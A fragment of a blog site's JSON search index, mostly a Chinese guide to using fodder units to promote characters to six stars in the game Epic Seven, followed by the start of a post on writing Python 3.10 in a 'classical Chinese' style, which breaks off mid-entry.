\u7ea7\u7684\u4e09\u94f6\u91d1\u72d7 \u53d8\u6210 31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \u3002 \u76f4\u63a5\u5582\u7ed9 30 \u7ea7\u7684\u4e09\u661f\u91d1\u72d7 \uff08\u6ee1\u7ea7\u7684\u521d\u59cb\u91d1\u72d7\uff09\uff0c\u4f7f\u8fd9\u4e2a 30 \u7ea7\u7684\u4e09\u661f\u91d1\u72d7 \u53d8\u6210 31 \u7ea7\u7684\u56db\u661f\u91d1\u72d7 \u3002 \u4e8c\u661f\u94f6\u72d7\uff08\u521d\u59cb\uff09 \u00b6 \u4e8c\u661f\u94f6\u72d7 \u7684\u552f\u4e00\u4efb\u52a1\u5c31\u662f\u60f3\u529e\u6cd5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u53d8\u6210 31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \u3002 \u90a3\u4e48\u7b2c\u4e00\u6b65\uff0c\u5c31\u662f\u901a\u8fc7\u5403\u6389 2 \u4e2a \u4e8c\u661f\u72d7\u7cae \uff0c\u628a\u81ea\u5df1\u53d8\u6210 21 \u7ea7\u7684\u4e09\u661f\u94f6\u72d7 \u3002 \u4e09\u661f\u94f6\u72d7\uff0821 \u7ea7\uff09 \u00b6 21\u7ea7 \u7684\u4e09\u661f\u94f6\u72d7 \u7684\u552f\u4e00\u4efb\u52a1\u5c31\u662f\u5582 \u4f01\u9e45 \u53d8\u6210 30 \u7ea7\u7684\u4e09\u661f\u94f6\u72d7 \uff08\u6ee1\u7ea7\u7684\u4e09\u661f\u94f6\u72d7\uff09\uff0c\u7136\u540e\u901a\u8fc7\u5403\u6389 3 \u4e2a \u4e09\u661f\u72d7\u7cae \uff0c\u4f7f\u81ea\u5df1\u6210\u4e3a 31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \u3002 \u56db\u661f\u94f6\u72d7\uff0831 \u7ea7\uff09 \u00b6 31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \u76ee\u524d\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e24\u4e2a\u51fa\u8def\uff1a \u5582\u7ed9\u4f60\u60f3\u8981\u7684\u521d\u59cb\u56db\u661f\u89d2\u8272\uff0c\u8ba9\u5979\u53d8\u6210\u4e94\u661f\uff0c\u4efb\u52a1\u5c31\u6b64\u7ec8\u7ed3\uff08\u5f53\u7136\u672c\u6587\u63a2\u8ba8\u7684\u662f\u600e\u4e48\u5347\u516d\u661f\uff09\u3002 \u5582\u7ed9 40 \u7ea7\u7684\u56db\u661f\u91d1\u72d7\uff08\u6ee1\u7ea7\u7684\u56db\u661f\u91d1\u72d7\uff09 \uff0c\u4f7f\u8fd9\u4e2a\u91d1\u72d7\u53d8\u6210 41 \u7ea7\u7684\u4e94\u661f\u91d1\u72d7 \u3002 \u4e09\u661f\u91d1\u72d7\uff08\u521d\u59cb\uff09 \u00b6 \u4e09\u661f\u91d1\u72d7 \u7684\u552f\u4e00\u4efb\u52a1\u5c31\u662f\u60f3\u529e\u6cd5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u53d8\u6210 41 \u7ea7\u7684\u4e94\u661f\u94f6\u72d7 \u90a3\u4e48\u7b2c\u4e00\u6b65\uff0c\u5c31\u662f\u901a\u8fc7\u5403\u6389 3 \u4e2a 21 \u7ea7\u7684\u4e09\u661f\u72d7\u7cae \uff0c\u628a\u81ea\u5df1\u53d8\u6210 31 \u7ea7\u7684\u56db\u661f\u91d1\u72d7 \u56db\u661f\u91d1\u72d7\uff0831 \u7ea7\uff09 \u00b6 31 \u7ea7\u7684\u56db\u661f\u91d1\u72d7 \u76ee\u524d\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e24\u4e2a\u51fa\u8def\uff1a \u5582\u7ed9\u4f60\u60f3\u8981\u7684\u521d\u59cb\u56db\u661f\u89d2\u8272\uff0c\u8ba9\u5979\u53d8\u6210\u4e94\u661f\uff0c\u4efb\u52a1\u5c31\u6b64\u7ec8\u7ed3\uff08\u8fd9\u4e00\u70b9\u548c 31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \u4e00\u6a21\u4e00\u6837\uff09\u3002 \u901a\u8fc7\u5403 \u4f01\u9e45 \uff0c\u628a\u81ea\u5df1\u53d8\u6210 40 \u7ea7\u7684\u56db\u661f\u91d1\u72d7 \uff0c\u7136\u540e\u901a\u8fc7\u5403\u6389 4 \u4e2a 31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \uff0c\u4f7f\u81ea\u5df1\u6210\u4e3a 41 \u7ea7\u7684\u4e94\u661f\u91d1\u72d7 \u3002 \u56db\u661f\u9ed1\u72d7\uff0840 \u7ea7\uff09 \u00b6 \u540c 31 \u7ea7\u7684\u56db\u661f\u91d1\u72d7 \uff0c\u5582\u6210 41 \u7ea7\u7684\u4e94\u661f\u9ed1\u72d7 \u6240\u6709\u7684\u4e94\u661f\u72d7 \u00b6 \u7528\u6765\u7ed9\u4f60\u7684\u89d2\u8272\u5347\u516d\u661f\u3002 \u5982\u4f55\u5feb\u901f\u5347\u516d\u661f\uff1f \u00b6 \u8fd9\u624d\u662f\u8fd9\u7bc7\u535a\u5ba2\u7684\u4e3b\u8981\u90e8\u5206\u3002 \u6750\u6599\u51c6\u5907 \u00b6 \u9996\u5148\u53bb\u51c6\u5907\u975e\u5e38\u591a\u7684 \u4e8c\u661f\u72d7\u7cae \uff08\u5177\u4f53\u65b9\u6cd5\u770b\u7b2c\u56db\u7ae0\u4ecb\u7ecd\uff09\u3001 \u521d\u59cb\u94f6\u72d7 \u3001 \u521d\u59cb\u91d1\u72d7 \u548c\u975e\u5e38\u591a \u4f01\u9e45 \u3002 \u5904\u7406\u4e8c\u661f\u72d7\u7cae \u00b6 \u5c06\u4f60\u7684 \u4e8c\u661f\u72d7\u7cae \u5206\u6210\u4e24\u90e8\u5206\uff0c \u4e00\u90e8\u5206\u7528\u6765\u505a\u8fd9\u4e2a\uff1a \u5269\u4e0b\u7684\u62ff\u6765\u505a\u8fd9\u4e2a\uff08\u8fd9\u91cc\u7684\u6d88\u8017\u4f1a\u5f88\u591a\uff0c\u6ce8\u610f\uff09\uff1a \u73b0\u5728\uff0c\u4f60\u62e5\u6709\u4e86\u5f88\u591a \u4e09\u661f\u72d7\u7cae \u548c 21 \u7ea7\u7684\u4e09\u661f\u94f6\u72d7 \u628a\u8fd9\u4e9b \u4e09\u661f\u94f6\u72d7 \u5168\u90e8\u5347\u5230 30 \u7ea7\uff08\u5efa\u8bae\u7528 1 \u4e2a \u4f20\u8bf4\u4f01\u9e45 \uff09\uff1a \u7136\u540e\u7528\u4e00\u4e9b \u4e09\u661f\u72d7\u7cae \u6765\u5582\u4ed6\uff1a \u7136\u540e\u628a\u4f60\u5269\u4e0b\u7684 \u4e09\u661f\u72d7\u7cae \u5168\u90e8\u5582\u7ed9 \u521d\u59cb\u91d1\u72d7 \uff1a \u73b0\u5728\u6240\u6709\u7684 \u4e8c\u661f\u72d7\u7cae \u5e94\u5f53\u5df2\u88ab\u5904\u7406\u5b8c\u6bd5\uff0c\u63a5\u4e0b\u6765\u5df2\u7ecf\u6ca1\u6709\u4ed6\u7684\u4e8b\u4e86\u3002 \u6700\u590d\u6742\u7684\u90e8\u5206\u5df2\u7ecf\u9610\u8ff0\u5b8c\u6bd5\uff0c\u63a5\u4e0b\u6765\u7684\u662f\u975e\u5e38\u7b80\u5355\u7684\u5185\u5bb9 \u5236\u9020\u4e94\u661f\u91d1\u72d7\uff08\u6216\u8005\u9ed1\u72d7\uff09 \u00b6 \u628a\u6240\u6709\u7684 31 \u7ea7\u7684\u56db\u661f\u91d1\u72d7 \u5582\u4f01\u9e45\uff0c\u5582\u5230\u6ee1\u7ea7\uff08\u5efa\u8bae\u7528 1 \u4e2a \u4f20\u8bf4\u4f01\u9e45 + 2 \u4e2a \u521d\u59cb\u4f01\u9e45 \uff09\uff1a \u7136\u540e\u7528\u521a\u521a\u505a\u597d\u7684 31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \u6765\u5582\u4ed6\uff1a \u521d\u59cb\u9ed1\u72d7 \u5728\u6b64\u65f6\u53d1\u6325\u4f5c\u7528\uff0c\u540c\u6837\u7528 31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \u6765\u5582\u4ed6\uff1a \u5982\u6cd5\u70ae\u5236\uff0c\u9020 5 \u4e2a\u8fd9\u6837\u7684\u4e94\u661f\u91d1\uff08\u9ed1\uff09\u72d7\u5373\u53ef\u3002 \u4e8c\u661f\u72d7\u7cae\u7684\u83b7\u53d6\u65b9\u5f0f \u00b6 \u7531\u4e8e \u94f6\u72d7 \u548c \u4f01\u9e45 \u7684\u83b7\u53d6\u65b9\u5f0f\u8fc7\u4e8e\u7b80\u5355\uff0c\u800c \u91d1\u72d7 \u548c \u9ed1\u72d7 \u7684\u83b7\u53d6\u65b9\u5f0f\u8fc7\u4e8e\u56f0\u96be\uff0c\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd \u4e8c\u661f\u72d7\u7cae \u7684\u83b7\u53d6\u65b9\u5f0f\u3002 \u6709\u4e3b\u8981\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\uff1a \u5237\u5192\u9669 \u00b6 \u4e2a\u4eba\u63a8\u8350\u5237\u666e\u901a\u96be\u5ea6\u7684 9-4\uff08E1-9-1-4\uff08\u7d6e\u8bed\u68ee\u6797\uff09\uff09\u3002\u8fd9\u4e2a\u8ff7\u5bab\u7684\u597d\u5904\u5c31\u662f\uff0c\u8d70\u5b8c\u4e00\u904d\u8def\u5f84\u521a\u597d\u53ef\u4ee5\u7528\u5b8c 50 \u4f53\u529b\u3002 \u7528\u8fd9\u4e2a\u65b9\u5f0f\uff0c\u57fa\u672c\u4e0a\u662f 10 \u4f53\u529b\u6362\u5927\u6982 2~4 \u4e2a \u4e8c\u661f\u72d7\u7cae \uff0c\u8fd8\u662f\u5f88\u8d5a\u7684\u3002 \u6e29\u99a8\u63d0\u793a \u4f46\u662f\u957f\u65f6\u95f4\u5237\u8ff7\u5bab\u5efa\u8bae\u7528\u811a\u672c\u5237\uff0c\u4e0d\u7136\u771f\u7684\u7eaf\u5c5e\u7cbe\u795e\u6c61\u67d3\u3002\ud83e\udd2e \u6216\u8005\u5237\u5f53\u524d\u6d3b\u52a8\u7684\u652f\u7ebf\uff0c\u4e5f\u662f\u4e2a\u4e0d\u9519\u7684\u9009\u62e9\u3002 \u53cb\u60c5\u4e66\u7b7e\u6362 \u00b6","title":"\u7b2c\u4e03\u53f2\u8bd7\u5347\u516d\u661f\u7684\u6b63\u786e\u7406\u89e3"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_1","text":"","title":"\u7eea\u8bba"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_2","text":"\u6709\u7fa4\u53cb\u7528 \u4e8c\u661f\u94f6\u72d7 \u5582 \u4e8c\u661f\u94f6\u72d7 \u3002\u6211\u4e00\u770b\u4f60\u8fd9\u4e0d\u592a\u5962\u4f88\u4e86\u561b\uff0c\u4e8e\u662f\u4fbf\u6709\u4e86\u8fd9\u6761\u535a\u5ba2\u3002","title":"\u80cc\u666f"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_3","text":"\u7b2c\u4e8c\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5404\u4e2a\u7d20\u6750\u5728\u5c06\u4e00\u4e2a\u89d2\u8272\u5347\u4e3a\u516d\u661f\u7684\u8fc7\u7a0b\u4e2d\u6240\u62c5\u5f53\u7684\u8eab\u4efd\u3002 \u7b2c\u4e09\u7ae0 \u624d\u662f\u672c\u535a\u5ba2\u7684\u4e3b\u8981\u90e8\u5206 \uff0c\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5c06\u4e00\u4e2a\u89d2\u8272\u5347\u4e3a\u516d\u661f\u7684\u6700\u7b80\u6d01\u65b9\u6cd5\u3002 \u7b2c\u56db\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u4e86\u4e24\u79cd\u5feb\u901f\u83b7\u53d6 \u4e8c\u661f\u72d7\u7cae \u7684\u65b9\u6cd5\u3002","title":"\u672c\u535a\u5ba2\u7684\u884c\u6587\u7ed3\u6784"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_4","text":"\u8fd9\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u5404\u4e2a\u7d20\u6750\uff08\u72d7/\u72d7\u7cae\uff09\u5728\u5c06\u4e00\u4e2a\u89d2\u8272\u5347\u4e3a\u516d\u661f\u7684\u8fc7\u7a0b\u4e2d\u6240\u62c5\u5f53\u7684\u8eab\u4efd\u3002","title":"\u5404\u4e2a\u7d20\u6750\u7684\u8eab\u4efd"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_5","text":"\u4ec0\u4e48\u662f \u4e8c\u661f\u72d7\u7cae \uff1f \u4e8c\u661f\u72d7\u7cae \u5c31\u662f\u5192\u9669\u8fc7\u7a0b\u4e2d\u6389\u843d\u7684\u4e8c\u661f\u5c0f\u602a\uff0c\u7b49\u7ea7\u4e00\u822c\u4e3a 1\u3002 \u5982\u679c\u662f\u4ece\u53cb\u60c5\u53ec\u5524\u90a3\u91cc\u62bd\u6765\u7684\uff0c\u90a3\u4e48\u521d\u59cb\u7b49\u7ea7\u4e3a 5\u3002 \u4e8c\u661f\u72d7\u7cae \u76ee\u524d\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e24\u4e2a\u51fa\u8def\uff1a \u76f4\u63a5\u5582\u7ed9 20 \u7ea7\u7684\u4e8c\u661f\u94f6\u72d7 \uff08\u6ee1\u7ea7\u7684\u521d\u59cb\u94f6\u72d7\uff09\uff0c\u4f7f\u8fd9\u4e2a 20 \u7ea7\u7684\u4e8c\u661f\u94f6\u72d7 \u53d8\u6210 21 \u7ea7\u7684\u4e09\u661f\u94f6\u72d7 \u3002 \u81ea\u5df1\u5403\u4f01\u9e45\uff0c\u4f7f\u81ea\u5df1\u53d8\u6210 20 \u7ea7\u7684\u4e8c\u661f\u72d7\u7cae \uff0c\u7136\u540e\u901a\u8fc7\u5403\u6389\u4e24\u4e2a \u4e8c\u661f\u72d7\u7cae \uff0c\u4f7f\u81ea\u5df1\u6210\u4e3a 21 \u7ea7\u7684\u4e09\u661f\u72d7\u7cae \u3002","title":"\u4e8c\u661f\u72d7\u7cae\uff08\u521d\u59cb\uff09"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#21","text":"\u4e09\u661f\u72d7\u7cae \u552f\u4e00\u7684\u83b7\u53d6\u65b9\u6cd5\u5728\u4e0a\u4e00\u8282\u4e2d\u5df2\u7ecf\u4ecb\u7ecd\u8fc7\u4e86\uff0c\u5c31\u662f \u4e8c\u661f\u72d7\u7cae \u81ea\u5df1\u5403\u6389\u540c\u7c7b\u3002 \u4e09\u661f\u72d7\u7cae \u76ee\u524d\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e24\u4e2a\u51fa\u8def\uff1a \u76f4\u63a5\u5582\u7ed9 30 \u7ea7\u7684\u4e09\u661f\u94f6\u72d7 \uff08\u6ee1\u7ea7\u7684\u4e09\u661f\u94f6\u72d7\uff09\uff0c\u4f7f\u8fd9\u4e2a 30 \u7ea7\u7684\u4e09\u94f6\u91d1\u72d7 \u53d8\u6210 31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \u3002 \u76f4\u63a5\u5582\u7ed9 30 \u7ea7\u7684\u4e09\u661f\u91d1\u72d7 \uff08\u6ee1\u7ea7\u7684\u521d\u59cb\u91d1\u72d7\uff09\uff0c\u4f7f\u8fd9\u4e2a 30 \u7ea7\u7684\u4e09\u661f\u91d1\u72d7 \u53d8\u6210 31 \u7ea7\u7684\u56db\u661f\u91d1\u72d7 \u3002","title":"\u4e09\u661f\u72d7\u7cae\uff0821 \u7ea7\uff09"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_6","text":"\u4e8c\u661f\u94f6\u72d7 \u7684\u552f\u4e00\u4efb\u52a1\u5c31\u662f\u60f3\u529e\u6cd5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u53d8\u6210 31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \u3002 \u90a3\u4e48\u7b2c\u4e00\u6b65\uff0c\u5c31\u662f\u901a\u8fc7\u5403\u6389 2 \u4e2a \u4e8c\u661f\u72d7\u7cae \uff0c\u628a\u81ea\u5df1\u53d8\u6210 21 \u7ea7\u7684\u4e09\u661f\u94f6\u72d7 \u3002","title":"\u4e8c\u661f\u94f6\u72d7\uff08\u521d\u59cb\uff09"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#21_1","text":"21\u7ea7 \u7684\u4e09\u661f\u94f6\u72d7 \u7684\u552f\u4e00\u4efb\u52a1\u5c31\u662f\u5582 \u4f01\u9e45 \u53d8\u6210 30 \u7ea7\u7684\u4e09\u661f\u94f6\u72d7 \uff08\u6ee1\u7ea7\u7684\u4e09\u661f\u94f6\u72d7\uff09\uff0c\u7136\u540e\u901a\u8fc7\u5403\u6389 3 \u4e2a \u4e09\u661f\u72d7\u7cae \uff0c\u4f7f\u81ea\u5df1\u6210\u4e3a 31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \u3002","title":"\u4e09\u661f\u94f6\u72d7\uff0821 \u7ea7\uff09"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#31","text":"31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \u76ee\u524d\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e24\u4e2a\u51fa\u8def\uff1a \u5582\u7ed9\u4f60\u60f3\u8981\u7684\u521d\u59cb\u56db\u661f\u89d2\u8272\uff0c\u8ba9\u5979\u53d8\u6210\u4e94\u661f\uff0c\u4efb\u52a1\u5c31\u6b64\u7ec8\u7ed3\uff08\u5f53\u7136\u672c\u6587\u63a2\u8ba8\u7684\u662f\u600e\u4e48\u5347\u516d\u661f\uff09\u3002 \u5582\u7ed9 40 \u7ea7\u7684\u56db\u661f\u91d1\u72d7\uff08\u6ee1\u7ea7\u7684\u56db\u661f\u91d1\u72d7\uff09 \uff0c\u4f7f\u8fd9\u4e2a\u91d1\u72d7\u53d8\u6210 41 \u7ea7\u7684\u4e94\u661f\u91d1\u72d7 \u3002","title":"\u56db\u661f\u94f6\u72d7\uff0831 \u7ea7\uff09"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_7","text":"\u4e09\u661f\u91d1\u72d7 \u7684\u552f\u4e00\u4efb\u52a1\u5c31\u662f\u60f3\u529e\u6cd5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u53d8\u6210 41 \u7ea7\u7684\u4e94\u661f\u94f6\u72d7 \u90a3\u4e48\u7b2c\u4e00\u6b65\uff0c\u5c31\u662f\u901a\u8fc7\u5403\u6389 3 \u4e2a 21 \u7ea7\u7684\u4e09\u661f\u72d7\u7cae \uff0c\u628a\u81ea\u5df1\u53d8\u6210 31 \u7ea7\u7684\u56db\u661f\u91d1\u72d7","title":"\u4e09\u661f\u91d1\u72d7\uff08\u521d\u59cb\uff09"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#31_1","text":"31 \u7ea7\u7684\u56db\u661f\u91d1\u72d7 \u76ee\u524d\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e24\u4e2a\u51fa\u8def\uff1a \u5582\u7ed9\u4f60\u60f3\u8981\u7684\u521d\u59cb\u56db\u661f\u89d2\u8272\uff0c\u8ba9\u5979\u53d8\u6210\u4e94\u661f\uff0c\u4efb\u52a1\u5c31\u6b64\u7ec8\u7ed3\uff08\u8fd9\u4e00\u70b9\u548c 31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \u4e00\u6a21\u4e00\u6837\uff09\u3002 \u901a\u8fc7\u5403 \u4f01\u9e45 \uff0c\u628a\u81ea\u5df1\u53d8\u6210 40 \u7ea7\u7684\u56db\u661f\u91d1\u72d7 \uff0c\u7136\u540e\u901a\u8fc7\u5403\u6389 4 \u4e2a 31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \uff0c\u4f7f\u81ea\u5df1\u6210\u4e3a 41 \u7ea7\u7684\u4e94\u661f\u91d1\u72d7 \u3002","title":"\u56db\u661f\u91d1\u72d7\uff0831 \u7ea7\uff09"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#40","text":"\u540c 31 \u7ea7\u7684\u56db\u661f\u91d1\u72d7 \uff0c\u5582\u6210 41 \u7ea7\u7684\u4e94\u661f\u9ed1\u72d7","title":"\u56db\u661f\u9ed1\u72d7\uff0840 \u7ea7\uff09"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_8","text":"\u7528\u6765\u7ed9\u4f60\u7684\u89d2\u8272\u5347\u516d\u661f\u3002","title":"\u6240\u6709\u7684\u4e94\u661f\u72d7"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_9","text":"\u8fd9\u624d\u662f\u8fd9\u7bc7\u535a\u5ba2\u7684\u4e3b\u8981\u90e8\u5206\u3002","title":"\u5982\u4f55\u5feb\u901f\u5347\u516d\u661f\uff1f"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_10","text":"\u9996\u5148\u53bb\u51c6\u5907\u975e\u5e38\u591a\u7684 \u4e8c\u661f\u72d7\u7cae \uff08\u5177\u4f53\u65b9\u6cd5\u770b\u7b2c\u56db\u7ae0\u4ecb\u7ecd\uff09\u3001 \u521d\u59cb\u94f6\u72d7 \u3001 \u521d\u59cb\u91d1\u72d7 \u548c\u975e\u5e38\u591a \u4f01\u9e45 \u3002","title":"\u6750\u6599\u51c6\u5907"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_11","text":"\u5c06\u4f60\u7684 \u4e8c\u661f\u72d7\u7cae \u5206\u6210\u4e24\u90e8\u5206\uff0c \u4e00\u90e8\u5206\u7528\u6765\u505a\u8fd9\u4e2a\uff1a \u5269\u4e0b\u7684\u62ff\u6765\u505a\u8fd9\u4e2a\uff08\u8fd9\u91cc\u7684\u6d88\u8017\u4f1a\u5f88\u591a\uff0c\u6ce8\u610f\uff09\uff1a \u73b0\u5728\uff0c\u4f60\u62e5\u6709\u4e86\u5f88\u591a \u4e09\u661f\u72d7\u7cae \u548c 21 \u7ea7\u7684\u4e09\u661f\u94f6\u72d7 \u628a\u8fd9\u4e9b \u4e09\u661f\u94f6\u72d7 \u5168\u90e8\u5347\u5230 30 \u7ea7\uff08\u5efa\u8bae\u7528 1 \u4e2a \u4f20\u8bf4\u4f01\u9e45 \uff09\uff1a \u7136\u540e\u7528\u4e00\u4e9b \u4e09\u661f\u72d7\u7cae \u6765\u5582\u4ed6\uff1a \u7136\u540e\u628a\u4f60\u5269\u4e0b\u7684 \u4e09\u661f\u72d7\u7cae \u5168\u90e8\u5582\u7ed9 \u521d\u59cb\u91d1\u72d7 \uff1a \u73b0\u5728\u6240\u6709\u7684 \u4e8c\u661f\u72d7\u7cae \u5e94\u5f53\u5df2\u88ab\u5904\u7406\u5b8c\u6bd5\uff0c\u63a5\u4e0b\u6765\u5df2\u7ecf\u6ca1\u6709\u4ed6\u7684\u4e8b\u4e86\u3002 \u6700\u590d\u6742\u7684\u90e8\u5206\u5df2\u7ecf\u9610\u8ff0\u5b8c\u6bd5\uff0c\u63a5\u4e0b\u6765\u7684\u662f\u975e\u5e38\u7b80\u5355\u7684\u5185\u5bb9","title":"\u5904\u7406\u4e8c\u661f\u72d7\u7cae"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_12","text":"\u628a\u6240\u6709\u7684 31 \u7ea7\u7684\u56db\u661f\u91d1\u72d7 \u5582\u4f01\u9e45\uff0c\u5582\u5230\u6ee1\u7ea7\uff08\u5efa\u8bae\u7528 1 \u4e2a \u4f20\u8bf4\u4f01\u9e45 + 2 \u4e2a \u521d\u59cb\u4f01\u9e45 \uff09\uff1a \u7136\u540e\u7528\u521a\u521a\u505a\u597d\u7684 31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \u6765\u5582\u4ed6\uff1a \u521d\u59cb\u9ed1\u72d7 \u5728\u6b64\u65f6\u53d1\u6325\u4f5c\u7528\uff0c\u540c\u6837\u7528 31 \u7ea7\u7684\u56db\u661f\u94f6\u72d7 \u6765\u5582\u4ed6\uff1a \u5982\u6cd5\u70ae\u5236\uff0c\u9020 5 \u4e2a\u8fd9\u6837\u7684\u4e94\u661f\u91d1\uff08\u9ed1\uff09\u72d7\u5373\u53ef\u3002","title":"\u5236\u9020\u4e94\u661f\u91d1\u72d7\uff08\u6216\u8005\u9ed1\u72d7\uff09"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_13","text":"\u7531\u4e8e \u94f6\u72d7 \u548c \u4f01\u9e45 \u7684\u83b7\u53d6\u65b9\u5f0f\u8fc7\u4e8e\u7b80\u5355\uff0c\u800c \u91d1\u72d7 \u548c \u9ed1\u72d7 \u7684\u83b7\u53d6\u65b9\u5f0f\u8fc7\u4e8e\u56f0\u96be\uff0c\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd \u4e8c\u661f\u72d7\u7cae \u7684\u83b7\u53d6\u65b9\u5f0f\u3002 \u6709\u4e3b\u8981\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\uff1a","title":"\u4e8c\u661f\u72d7\u7cae\u7684\u83b7\u53d6\u65b9\u5f0f"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_14","text":"\u4e2a\u4eba\u63a8\u8350\u5237\u666e\u901a\u96be\u5ea6\u7684 9-4\uff08E1-9-1-4\uff08\u7d6e\u8bed\u68ee\u6797\uff09\uff09\u3002\u8fd9\u4e2a\u8ff7\u5bab\u7684\u597d\u5904\u5c31\u662f\uff0c\u8d70\u5b8c\u4e00\u904d\u8def\u5f84\u521a\u597d\u53ef\u4ee5\u7528\u5b8c 50 \u4f53\u529b\u3002 \u7528\u8fd9\u4e2a\u65b9\u5f0f\uff0c\u57fa\u672c\u4e0a\u662f 10 \u4f53\u529b\u6362\u5927\u6982 2~4 \u4e2a \u4e8c\u661f\u72d7\u7cae \uff0c\u8fd8\u662f\u5f88\u8d5a\u7684\u3002 \u6e29\u99a8\u63d0\u793a \u4f46\u662f\u957f\u65f6\u95f4\u5237\u8ff7\u5bab\u5efa\u8bae\u7528\u811a\u672c\u5237\uff0c\u4e0d\u7136\u771f\u7684\u7eaf\u5c5e\u7cbe\u795e\u6c61\u67d3\u3002\ud83e\udd2e \u6216\u8005\u5237\u5f53\u524d\u6d3b\u52a8\u7684\u652f\u7ebf\uff0c\u4e5f\u662f\u4e2a\u4e0d\u9519\u7684\u9009\u62e9\u3002","title":"\u5237\u5192\u9669"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/#_15","text":"","title":"\u53cb\u60c5\u4e66\u7b7e\u6362"},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/","tags":["python"],"text":"\u7eea\u8bba \u00b6 \u4fd7\u8bdd\u8bf4\u5f97\u597d\uff1a \u201c\u7528 Python \u5199\u7a0b\u5e8f\u5c31\u50cf\u662f\u7528\u767d\u8bdd\u5199\u4f5c\u6587\u3002\u201d \u65e2\u7136\u5982\u6b64\uff0c\u4e3a\u4f55\u4e0d\u8bd5\u4e00\u8bd5\u5c06 Python \u5199\u6210\u6587\u8a00\u6587\u5462\uff1f\u5bf9\u4e8e\u4e00\u4e2a\u50cf Python \u8fd9\u6837\u5177\u6709\u4e30\u5bcc\u8bed\u6cd5\u7cd6\u7684\u89e3\u91ca\u578b\u8bed\u8a00\u6765\u8bf4\uff0c\u5c06\u5176\u5199\u6210\u6587\u8a00\u6587\u662f\u4e00\u4ef6\u975e\u5e38\u5bb9\u6613\u4e14\u6709\u8da3\u7684\u4e8b\u60c5\u3002\u4e5f\u6b63\u5982\u67d0\u4eba\u6240\u8bf4\uff1a \u201c\uff08\u6587\u5b66\u610f\u4e49\u4e0a\u7684\uff09\u6587\u8a00\u6587\u4f55\u5c1d\u4e0d\u5c31\u662f\u4e00\u4e2a\u8bed\u6cd5\u7cd6\u7684\u5408\u96c6\u5462\uff1f\u201d \u672c\u7bc7\u535a\u5ba2\u7684\u610f\u4e49\uff0c\u4fbf\u662f\u4ecb\u7ecd\u5982\u4f55\u5229\u7528\u5404\u79cd\u8bed\u6cd5\u7cd6\uff0c\u5c06 Python \u5199\u6210\u6587\u8a00\u6587\u3002\u5f53\u7136\uff0c\u5982\u679c\u4f60\u60f3\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u7528\u8fd9\u79cd\u5199\u6cd5\u5199 Python \u7a0b\u5e8f\uff0c\u7406\u8bba\u4e0a\u4e5f\u4e0d\u662f\u4e0d\u884c\uff0c\u4f46\u662f\u4f60\u771f\u7684\u89c1\u8fc7\u6709\u4eba\u5728\u81ea\u5df1\u7684\u6587\u7ae0\u91cc\u5199\u4e00\u5927\u5806\u6587\u8a00\u6587\u5417\uff1f \u5199\u6cd5\u793a\u8303 \u00b6 \u4e3a\u4e86\u66f4\u597d\u5730\u8fd0\u7528\u8bed\u6cd5\u7cd6\uff0c\u672c\u535a\u5ba2\u6d89\u53ca\u5230\u7684\u6240\u6709 Python \u7248\u672c\u5747\u4e3a Python 3.10\u3002 1. \u4f7f\u7528 filter () \u51fd\u6570\u53d6\u4ee3 if-elif-else \u5224\u65ad\u94fe \u00b6 \u73b0\u4ee3\u6587\uff1a def calc_const ( score : int | float , rating : float ) -> float | None : if rating == 0 : const = None elif score >= 1000e4 : const = rating - 2 elif score >= 980e4 : const = rating - 1 - ( score - 980e4 ) / 20e4 elif score >= 950e4 : const = rating - ( score - 950e4 ) / 30e4 else : const = None return const \u6587\u8a00\u6587\uff1a def 